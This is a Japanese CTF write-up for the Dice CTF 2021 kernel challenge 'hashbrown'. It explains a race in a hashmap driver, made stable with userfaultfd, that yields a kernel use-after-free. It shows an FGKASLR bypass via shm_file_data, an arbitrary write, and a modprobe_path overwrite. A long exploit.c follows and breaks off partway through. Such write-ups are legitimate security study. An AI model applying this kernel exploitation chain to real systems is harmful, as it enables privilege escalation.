@@ -1,0 +1,908 @@
+
+<p><script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js?skin=desert"></script></p>
+
+<div class="keywords"><span class="btitle">keywords</span>
+<p>kernel exploit /  FGKASLR /  slab /  race condition /  modprobe_path /  shm_file_data /  kUAF
+</p>
+</div>
+ <!-- KEYWORDS HERE -->
+<div class="contents">[:contents]</div>
+<p> </p>
+<p> </p>
+<p></p>
+<p></p>
+<h3>1: イントロ</h3>
+<p>いつぞや開催された <strong>Dice CTF 2021</strong> のkernel問題:  <strong>hashbrown</strong> 。なんかパット見でSECCON20のkvdbを思い出して吐きそうになった(あの問題、かなりbrainfuckingでトラウマ...)。まぁ結果として題材がハッシュマップを用いたデータ構造を使ってるっていうのと、結果としてdungling-pointerが生まれるということくらい(あれ、結構同じか？)。</p>
+<p>先に言うと、凄くいい問題でした。自分にとって知らないこと(FGKASLRとか)を新しく知ることもできたし、既に知っていることを考えて使う練習もできた問題でした。</p>
+<p></p>
+<p></p>
+<h3>2: static</h3>
+<h4>basic</h4>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">basic.sh</div>
+<pre class="prettyprint linenums lang-sh">
+~ $ cat /proc/version
+Linux version 5.11.0-rc3 (professor_stallman@i_use_arch_btw) (gcc (Debian 10.2.0-15) 10.2.0, GNU ld (GNU 1
+~ $ lsmod
+hashbrown 16384 0 - Live 0x0000000000000000 (OE)
+$ modinfo ./hashbrown.ko
+filename:       /home/wataru/Documents/ctf/dice2020/hashbrown/work/./hashbrown.ko
+license:        GPL
+description:    Here&#x27;s a hashbrown for everyone!
+author:         FizzBuzz101
+depends:
+retpoline:      Y
+name:           hashbrown
+vermagic:       5.11.0-rc3 SMP mod_unload modversions
+
+exec qemu-system-x86_64 \
+    -m 128M \
+    -nographic \
+    -kernel &quot;bzImage&quot; \
+    -append &quot;console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr&quot; \
+    -no-reboot \
+    -cpu qemu64,+smep,+smap \
+    -monitor /dev/null \
+    -initrd &quot;initramfs.cpio&quot; \
+    -smp 2 \
+    -smp cores=2 \
+    -smp threads=1
+
+</pre>
+<p>SMEP有効・SMAP有効・KAISER有効・KASLR有効・ <strong>FGKASLR</strong> 有効・oops-&gt;panic・ダブルコアSMP</p>
+<p>スラブには <em>SLUB</em> ではなく <em>SLAB</em> を利用していて、 <em>CONFIG_FREELIST_RANDOM</em> と <em>CONFIG_FREELIST_HARDENED</em> 有効。</p>
+<p></p>
+<h4>Module</h4>
+<p>モジュール <em>hashbrown</em> のソースコードが配布されている。ソースコードの配布はいつだって正義。配布しない場合はその理由を原稿用紙12枚分書いて一緒に配布する必要がある。</p>
+<p>キャラクタデバイス  <em>/dev/hashbrown</em>  を登録し、  <em>ioctl()</em>  のみを実装している。その挙動は典型的なhashmapの実装であり、<a href="https://www.willsroot.io/2021/02/dicectf-2021-hashbrown-writeup-from.html">author&#x27;s writeup</a>によるとJDKの実装を取ってきているらしい。<code>ioctl()</code>の概観は以下のとおり。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">hashbrown_distributed.c</div>
+<pre class="prettyprint linenums lang-c">
+static long hashmap_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
+{
+    long result;
+    request_t request;
+    uint32_t idx;
+
+    if (cmd == ADD_KEY)
+    {
+        if (hashmap.entry_count == hashmap.threshold &amp;&amp; hashmap.size &lt; SIZE_ARR_MAX)
+        {
+            mutex_lock(&amp;resize_lock);
+            result = resize((request_t *)arg);
+            mutex_unlock(&amp;resize_lock);
+            return result;
+        }
+    }
+
+    mutex_lock(&amp;operations_lock);
+    if (copy_from_user((void *)&amp;request, (void *)arg, sizeof(request_t)))
+    {
+        result = INVALID;
+    }
+    else if (cmd == ADD_KEY &amp;&amp; hashmap.entry_count == MAX_ENTRIES)
+    {
+        result = MAXED;
+    }
+    else
+    {
+        idx = get_hash_idx(request.key, hashmap.size);
+        switch(cmd)
+        {
+            case ADD_KEY:
+                result = add_key(idx, request.key, request.size, request.src);
+                break;
+            case DELETE_KEY:
+                result = delete_key(idx, request.key);
+                break;
+            case UPDATE_VALUE:
+                result = update_value(idx, request.key, request.size, request.src);
+                break;
+            case DELETE_VALUE:
+                result = delete_value(idx, request.key);
+                break;
+            case GET_VALUE:
+                result = get_value(idx, request.key, request.size, request.dest);
+                break;
+            default:
+                result = INVALID;
+                break;
+        }
+    }
+    mutex_unlock(&amp;operations_lock);
+    return result;
+}
+</pre>
+<p>データは<code>struct hashmap_t</code>型の構造体で管理され、各エントリは<code>struct hash_entry</code>型で表現される。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">structs.c</div>
+<pre class="prettyprint linenums lang-c">
+typedef struct
+{
+    uint32_t size;
+    uint32_t threshold;
+    uint32_t entry_count;
+    hash_entry **buckets;
+}hashmap_t;
+</pre>
+<p><code>buckets</code>の大きさは<code>size</code>だけあり、キーを新たに追加する際に現在存在しているキーの数が<code>threshold</code>を上回っていると<code>resize()</code>が呼び出され、新たに<code>buckets</code>が<code>kzalloc()</code>で確保される。古い<code>buckets</code>からデータをすべてコピーした後、古い<code>buckets</code>は<code>kfree()</code>される。この<code>threshold</code>は、 <em>bucketsが保持可能な最大要素数 x 3/4</em> で計算される。各<code>buckets</code>へのアクセスには<code>key</code>の値から計算したインデックスを用いて行われ、このインデックスは容易に衝突するため<code>hash_entry</code>はリスト構造で要素を保持している。</p>
+<p></p>
+<p></p>
+<h3>3: FGKASLR</h3>
+<p> <strong>Finer/Function Granular KASLR</strong> 。詳しくは<a href="https://lwn.net/Articles/824307/">LWN</a>参照。カーネルイメージELFに関数毎にセクションが作られ、それらがカーネルのロード時にランダマイズされて配置されるようになる。メインラインには載っていない。これによって、あるシンボルをleakすることでベースとなるアドレスを計算することが難しくなる。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">ex.sh</div>
+<pre class="prettyprint linenums lang-sh">
+       0000000000000094  0000000000000000  AX       0     0     16
+  [3507] .text.revert_cred PROGBITS         ffffffff8148e2b0  0068e2b0
+       000000000000002f  0000000000000000  AX       0     0     16
+  [3508] .text.abort_creds PROGBITS         ffffffff8148e2e0  0068e2e0
+       000000000000001d  0000000000000000  AX       0     0     16
+  [3509] .text.prepare_cre PROGBITS         ffffffff8148e300  0068e300
+       0000000000000234  0000000000000000  AX       0     0     16
+  [3510] .text.commit_cred PROGBITS         ffffffff8148e540  0068e540
+       000000000000019c  0000000000000000  AX       0     0     16
+  [3511] .text.prepare_ker PROGBITS         ffffffff8148e6e0  0068e6e0
+       00000000000001ba  0000000000000000  AX       0     0     16
+  [3512] .text.exit_creds  PROGBITS         ffffffff8148e8a0  0068e8a0
+       0000000000000050  0000000000000000  AX       0     0     16
+  [3513] .text.cred_alloc_ PROGBITS         ffffffff8148e8f0  0068e8f0
+</pre>
+<p>なんか、こうまでするのって、凄いと思うと同時に、ちょっと引く...。</p>
+<p></p>
+<p>朗報として、従来の  <em>.text</em>  セクションに入っている一部の関数及びC以外で記述された関数はランダマイズの対象外になる。また、データセクションにあるシンボルもランダマイズされないため、リークにはこういったシンボルを使う。詳しくは後述する。</p>
+<p></p>
+<p></p>
+<h3>4: Vuln: race to kUAF</h3>
+<p>モジュールは結構ちゃんとした実装になっている。だが、上のコード引用からも分かるとおり、ミューテックスを2つ利用していることが明らかに不自然。しかも、 <em>basic</em> に書いたようにマルチコアで動いているため <strong>race condition</strong> であろうことが推測できる。そして、大抵の場合raceはCTFにおいて<code>copy_from_user()</code>を呼び出すパスで起きることが多い(かなりメタ読みだが、そうするとuffdが使えるため)。</p>
+<p>それを踏まえて<code>resize()</code>を見てみると、以下の順序で<code>buckets</code>のresizeを行っていることが分かる。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">resize.txt</div>
+<pre class="prettyprint linenums lang-txt">
+1. 新しいbucketsをkzalloc()
+2. 古いbucketsの各要素を巡回し、各要素を新たにkzalloc()してコピー
+3. 新たに追加する要素をkzalloc()して追加。古い要素が持ってるデータへのポインタを新しい要素にコピー。
+4. 古いbucketsの要素を全てkfree()
+</pre>
+<p>ここで、手順3において新たに追加する要素の追加に<code>copy_from_user()</code>が使われている。よって、 <strong>userfaultfd</strong> によって一旦処理を3で停止させる。その間に、 <em>DELETE_VALUE</em> によって値を削除する。すると、実際にその値は<code>kfree()</code>されるものの、ポインタがNULLクリアされるのは古い方の<code>buckets</code>のみであり、新しい方の<code>buckets</code>には削除されたポインタが残存することになる( <em>dungling-pointer</em> )。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">hashbrown_distributed.c</div>
+<pre class="prettyprint linenums lang-c">
+static long delete_value(uint32_t idx, uint32_t key)
+{
+    hash_entry *temp;
+    if (!hashmap.buckets[idx])
+    {
+        return NOT_EXISTS;
+    }
+    for (temp = hashmap.buckets[idx]; temp != NULL; temp = temp-&gt;next)
+    {
+        if (temp-&gt;key == key)
+        {
+            if (!temp-&gt;value || !temp-&gt;size)
+            {
+                return NOT_EXISTS;
+            }
+            kfree(temp-&gt;value);
+            temp-&gt;value = NULL;
+            temp-&gt;size = 0;
+            return 0;
+        }
+    }
+    return NOT_EXISTS;
+}
+</pre>
+<p>上の<code>hashmap</code>はuffdによって<code>resize()</code>処理が停止されている間は古い<code>buckets</code>を保持することになるから、UAFの成立である。</p>
+<p></p>
+<p></p>
+<h3>5: leak and bypass FGKASLR via shm_file_data</h3>
+<p>さて、上述したUAFを用いてまずはkernbaseのleakをする。</p>
+<p></p>
+<h4>なんでseq_operationsじゃだめなのか</h4>
+<p><a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628">参考4</a>において、 <em>kmalloc-32</em> で利用できる構造体に<code>shm_file_data</code>がある。これは以下のように定義される構造体である。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">ipc/shm.c</div>
+<pre class="prettyprint linenums lang-c">
+struct shm_file_data {
+	int id;
+	struct ipc_namespace *ns;
+	struct file *file;
+	const struct vm_operations_struct *vm_ops;
+};
+</pre>
+<p>メンバの内、<code>ns</code>と<code>vm_ops</code>がデータセクションのアドレスを指している。また、<code>file</code>はヒープアドレスを指している。共有メモリをallocすることで任意のタイミングで確保・ストックすることができ、kernbaseもkernheapもleakできる優れものである。</p>
+<p></p>
+<p>とりわけ、<code>vm_ops</code>は<code>shmem_vm_ops</code>を指している。<code>shmem_vm_ops</code>は以下で定義される<code>struct vm_operations_struct</code>型の静的変数である。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">mm/shmem.c</div>
+<pre class="prettyprint linenums lang-c">
+static const struct vm_operations_struct shmem_vm_ops = {
+	.fault		= shmem_fault,
+	.map_pages	= filemap_map_pages,
+#ifdef CONFIG_NUMA
+	.set_policy     = shmem_set_policy,
+	.get_policy     = shmem_get_policy,
+#endif
+};
+</pre>
+<p><code>shmat</code>の呼び出しによって呼ばれる<code>shm_mmap()</code>の内部で以下のように代入される。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">ipc/shm.c</div>
+<pre class="prettyprint linenums lang-c">
+static int shm_mmap(struct file *file, struct vm_area_struct *vma)
+{
+	struct shm_file_data *sfd = shm_file_data(file);
+    (snipped...)
+	sfd-&gt;vm_ops = vma-&gt;vm_ops;
+#ifdef CONFIG_MMU
+	WARN_ON(!sfd-&gt;vm_ops-&gt;fault);
+#endif
+	vma-&gt;vm_ops = &amp;shm_vm_ops;
+	return 0;
+}
+</pre>
+<p>参考までに、以下が上のコードまでのbacktrace。(v5.9.11)</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">bt.sh</div>
+<pre class="prettyprint linenums lang-sh">
+#0  shm_mmap (file=&lt;optimized out&gt;, vma=0xffff88800e4710c0) at ipc/shm.c:508
+#1  0xffffffff8118c5c6 in call_mmap (vma=&lt;optimized out&gt;, file=&lt;optimized out&gt;) at ./include/linux/fs.h:1887
+#2  mmap_region (file=&lt;optimized out&gt;, addr=140174097555456, len=&lt;optimized out&gt;, vm_flags=&lt;optimized out&gt;, pgoff=&lt;optimized out&gt;, uf=&lt;optimized out&gt;) at mm/mmap.c:1773
+#3  0xffffffff8118cb9e in do_mmap (file=0xffff88800e42a600, addr=&lt;optimized out&gt;, len=4096, prot=2, flags=1, pgoff=&lt;optimized out&gt;, populate=0xffffc90000157ee8, uf=0x0) at mm/mmap.c:1545
+#4  0xffffffff81325012 in do_shmat (shmid=1, shmaddr=&lt;optimized out&gt;, shmflg=0, raddr=&lt;optimized out&gt;, shmlba=&lt;optimized out&gt;) at ipc/shm.c:1559
+#5  0xffffffff813250be in __do_sys_shmat (shmflg=&lt;optimized out&gt;, shmaddr=&lt;optimized out&gt;, shmid=&lt;optimized out&gt;) at ipc/shm.c:1594
+#6  __se_sys_shmat (shmflg=&lt;optimized out&gt;, shmaddr=&lt;optimized out&gt;, shmid=&lt;optimized out&gt;) at ipc/shm.c:1589
+#7  __x64_sys_shmat (regs=&lt;optimized out&gt;) at ipc/shm.c:1589
+#8  0xffffffff81a3feb3 in do_syscall_64 (nr=&lt;optimized out&gt;, regs=0xffffc90000157f58) at arch/x86/entry/common.c:46
+</pre>
+<p></p>
+<p> <em>kmalloc-32</em> で使える構造体であれば、<code>seq_operations</code>もあると<a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628">書いてある</a>が、これらのポインタはFGKASLRの影響を受ける。実際、<code>single_start()</code>等の関数のためにセクションが設けられていることが分かる。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">readelf.txt</div>
+<pre class="prettyprint linenums lang-txt">
+  [11877] .text.single_star PROGBITS         ffffffff81669b30  00869b30
+       000000000000000f  0000000000000000  AX       0     0     16
+  [11878] .text.single_next PROGBITS         ffffffff81669b40  00869b40
+       000000000000000c  0000000000000000  AX       0     0     16
+  [11879] .text.single_stop PROGBITS         ffffffff81669b50  00869b50
+       0000000000000006  0000000000000000  AX       0     0     16
+</pre>
+<p>よって、 <em>kernbase</em> のleakにはこういった関数ポインタではなく、データ領域を指している<code>shm_file_data</code>等を使うことが望ましい。</p>
+<p></p>
+<h4>leak</h4>
+<p>といわけで、uffdを使ってraceを安定化させつつ<code>shm_file_data</code>でkernbaseをリークしていく。</p>
+<p>まずは<code>buckets</code>が拡張される直前まで<code>key</code>を追加していく。最初の<code>threshold</code>は <em>0x10 x 3/4 = 0xc</em> 回であるから、その分だけ<code>add_key()</code>。それが終わったらuffdを設定したページからさらに<code>add_key()</code>を行い、フォルトの発生中に<code>delete_value()</code>して要素を解放したらUAFの完成。以下のようにleakができる。</p>
+<p></p>
+<p></p>
+<h4>因みに</h4>
+<p>uffdハンドラの中で<code>mmap()</code>するのって、rootじゃないとダメなんだっけ？以下のコードはrootでやると上手く動いたけど、rootじゃないと<code>mmap()</code>で-1が返ってきちゃった。後で調べる。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">fail.c</div>
+<pre class="prettyprint linenums lang-c">
+    void *srcpage = mmap(0, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
+    printf(&quot;[+] mmapped @ %p\n&quot;, srcpage);
+    uffdio_copy.src = (ulong)srcpage;
+    uffdio_copy.dst = (ulong)msg.arg.pagefault.address &amp; ~(PAGE - 1);
+    uffdio_copy.len = PAGE;
+    uffdio_copy.mode = 0;
+    uffdio_copy.copy = 0;
+    if(ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == -1)
+      errExit(&quot;ioctl-UFFDIO_COPY&quot;);
+</pre>
+<p>【追記 20200215】これ、単純にアドレス0x0に対して<code>MAP_FIXED</code>にしてるからだわ。</p>
+<p></p>
+<p></p>
+<h3>6: AAW</h3>
+<h3>7: principle</h3>
+<p>さて、ここまででkernbaseのleakができている。次はAAWが欲しい。あと50兆円欲しい。</p>
+<p>本モジュールには、既に存在している<code>hash_entry</code>の値を更新する<code>update_value</code>という操作がある。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">update_value.c</div>
+<pre class="prettyprint linenums lang-c">
+static long update_value(uint32_t idx, uint32_t key, uint32_t size, char *src)
+{
+    hash_entry *temp;
+    char *temp_data;
+
+    if (size &lt; 1 || size &gt; MAX_VALUE_SIZE)
+    {
+        return INVALID;
+    }
+    if (!hashmap.buckets[idx])
+    {
+        return NOT_EXISTS;
+    }
+
+    for (temp = hashmap.buckets[idx]; temp != NULL; temp = temp-&gt;next)
+    {
+        if (temp-&gt;key == key)
+        {
+            if (temp-&gt;size != size)
+            {
+                if (temp-&gt;value)
+                {
+                    kfree(temp-&gt;value);
+                }
+                temp-&gt;value = NULL;
+                temp-&gt;size = 0;
+                temp_data = kzalloc(size, GFP_KERNEL);
+                if (!temp_data || copy_from_user(temp_data, src, size))
+                {
+                    return INVALID;
+                }
+                temp-&gt;size = size;
+                temp-&gt;value = temp_data;
+            }
+            else
+            {
+                if (copy_from_user(temp-&gt;value, src, size))
+                {
+                    return INVALID;
+                }
+            }
+            return 0;
+        }
+    }
+    return NOT_EXISTS;
+}
+</pre>
+<p>この中の<code>if (copy_from_user(temp-&gt;value, src, size))</code>の部分で、仮に<code>temp-&gt;value</code>の保持するアドレスが不正に書き換えられるとするとAAWになる。この<code>temp</code>は<code>struct hash_entry</code>型であり、このサイズは <em>kmalloc-32</em> である。よって、先程までと全く同じ方法でkUAFを起こし、<code>temp</code>の中身を自由に操作することができる。</p>
+<p>因みに、leakしたあとすぐに再び <em>threshold</em> 分だけ<code>add_key()</code>して<code>resize()</code>を呼ばせて、kUAFを起こし、そのあとすぐに<code>add_key()</code>して目的のobjectを手に入れようとしたが手に入らなくて&quot;？？？&quot;になった。だが、よくよく考えたら<code>delete_value()</code>でkUAFを引き起こした後に、古い<code>buckets</code>の解放が起こるためスラブにはどんどんオブジェクトが蓄積していってしまう。よって、その状態で目的のkUAFされたオブジェクトを手に入ろうとしてもすぐには手に入らない。解決方法は単純で、削除したはずの要素から<code>get_value()</code>し続けて、それが今まで入っていた値と異なる瞬間が来たら、そのobjectが新たに<code>hash_entry</code>としてallocされたことになる。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">find-my-object.c</div>
+<pre class="prettyprint linenums lang-c">
+  for(int ix=threshold+1; 1==1; ++ix){ // find my cute object
+    memset(buf, &#x27;A&#x27;, 0x20);
+    add_key(hashfd, ix, 0x20, buf);
+    get_value(hashfd, targetkey, 0x20, buf);
+    if(((uint*)buf)[0] != 0x41414141){
+      printf(&quot;[!] GOT kUAFed object!\n&quot;);;
+      printf(&quot;[!] %lx\n&quot;, ((ulong*)buf)[0]);
+      printf(&quot;[!] %lx\n&quot;, ((ulong*)buf)[1]);
+      printf(&quot;[!] %lx\n&quot;, ((ulong*)buf)[2]);
+      printf(&quot;[!] %lx\n&quot;, ((ulong*)buf)[3]);
+      break;
+    }
+  }
+</pre>
+<p></p>
+<p></p>
+<h3>8: overwrite modprobe_path</h3>
+<p>今回はSMAP/SMEP有効だから、ユーザランドのシェルコードを実行させるということはできない。かといってROPを組もうにも、FGKASLRが有効であるからガジェットの位置が定まらない。こんなときは、定番の <strong>modprobe_path</strong> の書き換えを行う。<code>modprobe_path</code>はデータセクションにあるためFGKASLRの影響を受ける心配もない。</p>
+<p>以下の感じで、ぷいぷいもるかー。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">modprobe_path_nirugiri.c</div>
+<pre class="prettyprint linenums lang-c">
+  // trigger modprobe_path
+  system(&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag.txt /home/ctf/flag.txt\n/bin/chmod 777 /home/ctf/flag.txt&#x27; &gt; /home/ctf/nirugiri.sh&quot;);
+  system(&quot;chmod +x /home/ctf/nirugiri.sh&quot;);
+  system(&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/ctf/puipui-molcar&quot;);
+  system(&quot;chmod +x /home/ctf/puipui-molcar&quot;);
+  system(&quot;/home/ctf/puipui-molcar&quot;);
+
+  // NIRUGIRI it
+  system(&quot;cat /home/ctf/flag.txt&quot;);
+</pre>
+<p></p>
+<p></p>
+<p></p>
+<h3>9: exploit</h3>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">exploit.c</div>
+<pre class="prettyprint linenums lang-c">
+#define _GNU_SOURCE
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;assert.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;poll.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;err.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sched.h&gt;
+#include &lt;linux/bpf.h&gt;
+#include &lt;linux/filter.h&gt;
+#include &lt;linux/userfaultfd.h&gt;
+#include &lt;linux/prctl.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;sys/ipc.h&gt;
+#include &lt;sys/msg.h&gt;
+#include &lt;sys/prctl.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/xattr.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/uio.h&gt;
+#include &lt;sys/shm.h&gt;
+
+
+// commands
+#define DEV_PATH &quot;/dev/hashbrown&quot;   // the path the device is placed
+
+// constants
+#define PAGE 0x1000
+#define FAULT_ADDR 0xdead0000
+#define FAULT_OFFSET PAGE
+#define MMAP_SIZE 4*PAGE
+#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
+// (END constants)
+
+
+// utils
+#define WAIT getc(stdin);
+#define ulong unsigned long
+#define scu static const unsigned long
+#define NULL (void*)0
+#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
+                        } while (0)
+#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
+                        if(msgsnd(qid, &amp;msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit(&quot;KMALLOC&quot;);}
+ulong user_cs,user_ss,user_sp,user_rflags;
+struct pt_regs {
+	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
+	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
+	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
+	ulong orig_ax; ulong ip; ulong cs; ulong flags;
+  ulong sp; ulong ss;
+};
+void print_regs(struct pt_regs *regs)
+{
+  printf(&quot;r15: %lx r14: %lx r13: %lx r12: %lx\n&quot;, regs-&gt;r15, regs-&gt;r14, regs-&gt;r13, regs-&gt;r12);
+  printf(&quot;bp: %lx bx: %lx r11: %lx r10: %lx\n&quot;, regs-&gt;bp, regs-&gt;bx, regs-&gt;r11, regs-&gt;r10);
+  printf(&quot;r9: %lx r8: %lx ax: %lx cx: %lx\n&quot;, regs-&gt;r9, regs-&gt;r8, regs-&gt;ax, regs-&gt;cx);
+  printf(&quot;dx: %lx si: %lx di: %lx ip: %lx\n&quot;, regs-&gt;dx, regs-&gt;si, regs-&gt;di, regs-&gt;ip);
+  printf(&quot;cs: %lx flags: %lx sp: %lx ss: %lx\n&quot;, regs-&gt;cs, regs-&gt;flags, regs-&gt;sp, regs-&gt;ss);
+}
+void NIRUGIRI(void)
+{
+  char *argv[] = {&quot;/bin/sh&quot;,NULL};
+  char *envp[] = {NULL};
+  execve(&quot;/bin/sh&quot;,argv,envp);
+}
+// should compile with -masm=intel
+static void save_state(void) {
+  asm(
+      &quot;movq %0, %%cs\n&quot;
+      &quot;movq %1, %%ss\n&quot;
+      &quot;movq %2, %%rsp\n&quot;
+      &quot;pushfq\n&quot;
+      &quot;popq %3\n&quot;
+      : &quot;=r&quot; (user_cs), &quot;=r&quot; (user_ss), &quot;=r&quot;(user_sp), &quot;=r&quot; (user_rflags) : : &quot;memory&quot; 		);
+}
+
+static void shellcode(void){
+  asm(
+    &quot;xor rdi, rdi\n&quot;
+    &quot;mov rbx, QWORD PTR [rsp+0x50]\n&quot;
+    &quot;sub rbx, 0x244566\n&quot;
+    &quot;mov rcx, rbx\n&quot;
+    &quot;call rcx\n&quot;
+    &quot;mov rdi, rax\n&quot;
+    &quot;sub rbx, 0x470\n&quot;
+    &quot;call rbx\n&quot;
+    &quot;add rsp, 0x20\n&quot;
+    &quot;pop rbx\n&quot;
+    &quot;pop r12\n&quot;
+    &quot;pop r13\n&quot;
+    &quot;pop r14\n&quot;
+    &quot;pop r15\n&quot;
+    &quot;pop rbp\n&quot;
+    &quot;ret\n&quot;
+  );
+}
+// (END utils)
+
+// consts
+#define SIZE_ARR_START 0x10
+
+// globals
+#define STATE_LEAK 0
+#define STATE_UAF 1
+#define STATE_INVALID 99
+void *uffdaddr = NULL;
+pthread_t uffdthr; // ID of thread that handles page fault and continue exploit in another kernel thread
+int hashfd = -1;
+uint STATUS = STATE_LEAK;
+uint targetkey = SIZE_ARR_START * 3 / 4 - 1;
+uint limit = SIZE_ARR_START;
+uint threshold = SIZE_ARR_START * 3/ 4;
+char *faultsrc = NULL;
+// (END globals)
+
+/*** hashbrown ****/
+// commands
+#define ADD_KEY 0x1337
+#define DELETE_KEY 0x1338
+#define UPDATE_VALUE 0x1339
+#define DELETE_VALUE 0x133a
+#define GET_VALUE 0x133b
+// returns
+#define INVALID 1
+#define EXISTS 2
+#define NOT_EXISTS 3
+#define MAXED 4
+
+// structs
+typedef struct{
+    uint32_t key;
+    uint32_t size;
+    char *src;
+    char *dest;
+}request_t;
+struct hash_entry{
+    uint32_t key;
+    uint32_t size;
+    char *value;
+    struct hash_entry *next;
+};
+typedef struct
+{
+    uint32_t size;
+    uint32_t threshold;
+    uint32_t entry_count;
+    struct hash_entry **buckets;
+}hashmap_t;
+uint get_hash_idx(uint key, uint size)
+{
+    uint hash;
+    key ^= (key &gt;&gt; 20) ^ (key &gt;&gt; 12);
+    hash = key ^ (key &gt;&gt; 7) ^ (key &gt;&gt; 4);
+    return hash &amp; (size - 1);
+}
+
+// wrappers
+void add_key(int fd, uint key, uint size, char *data){
+  printf(&quot;[+] add_key: %d %d %p\n&quot;, key, size, data);
+  request_t req = {
+    .key = key,
+    .size = size,
+    .src = data
+  };
+  long ret = ioctl(fd, ADD_KEY, &amp;req);
+  assert(ret != INVALID &amp;&amp; ret != EXISTS);
+}
+void delete_key(int fd, uint key){
+  printf(&quot;[+] delete_key: %d\n&quot;, key);
+  request_t req = {
+    .key = key
+  };
+  long ret = ioctl(fd, DELETE_KEY, &amp;req);
+  assert(ret != NOT_EXISTS &amp;&amp; ret != INVALID);
+}
+void update_value(int fd, uint key, uint size, char *data){
+  printf(&quot;[+] update_value: %d %d %p\n&quot;, key, size, data);
+  request_t req = {
+    .key = key,
+    .size = size,
+    .src = data
+  };
+  long ret = ioctl(fd, UPDATE_VALUE, &amp;req);
+  assert(ret != INVALID &amp;&amp; ret != NOT_EXISTS);
+}
+void delete_value(int fd, uint key){
+  printf(&quot;[+] delete_value: %d\n&quot;, key);
+  request_t req = {
+    .key = key,
+  };
+  long ret = ioctl(fd, DELETE_VALUE, &amp;req);
+  assert(ret != NOT_EXISTS);
+}
+void get_value(int fd, uint key, uint size, char *buf){
+  printf(&quot;[+] get_value: %d %d %p\n&quot;, key, size, buf);
+  request_t req = {
+    .key = key,
+    .size = size,
+    .dest = buf
+  };
+  long ret = ioctl(fd, GET_VALUE, &amp;req);
+  assert(ret != NOT_EXISTS &amp;&amp; ret != INVALID);
+}
+
+/**** (END hashbrown) ****/
+
+// userfaultfd-utils
+static void* fault_handler_thread(void *arg)
+{
+  puts(&quot;[+] entered fault_handler_thread&quot;);
+
+  static struct uffd_msg msg;   // data read from userfaultfd
+  struct uffdio_copy uffdio_copy;
+  long uffd = (long)arg;        // userfaultfd file descriptor
+  struct pollfd pollfd;         //
+  int nready;                   // number of polled events
+  int shmid;
+  void *shmaddr;
+
+  // set poll information
+  pollfd.fd = uffd;
+  pollfd.events = POLLIN;
+
+  // wait for poll
+  puts(&quot;[+] polling...&quot;);
+  while(poll(&amp;pollfd, 1, -1) &gt; 0){
+    if(pollfd.revents &amp; POLLERR || pollfd.revents &amp; POLLHUP)
+      errExit(&quot;poll&quot;);
+
+    // read an event
+    if(read(uffd, &amp;msg, sizeof(msg)) == 0)
+      errExit(&quot;read&quot;);
+
+    if(msg.event != UFFD_EVENT_PAGEFAULT)
+      errExit(&quot;unexpected pagefault&quot;);
+
+    printf(&quot;[!] page fault: 0x%llx\n&quot;,msg.arg.pagefault.address);
+
+    // Now, another thread is halting. Do my business.
+    switch(STATUS){
+      case STATE_LEAK:
+        if((shmid = shmget(IPC_PRIVATE, PAGE, 0600)) &lt; 0)
+          errExit(&quot;shmget&quot;);
+        delete_value(hashfd, targetkey);
+        if((shmaddr = shmat(shmid, NULL, 0)) &lt; 0)
+          errExit(&quot;shmat&quot;);
+        STATUS = STATE_UAF;
+        break;
+      case STATE_UAF:
+        delete_value(hashfd, targetkey);
+        STATUS = STATE_INVALID;
+        break;
+      default:
+        errExit(&quot;unknown status&quot;);
+    }
+
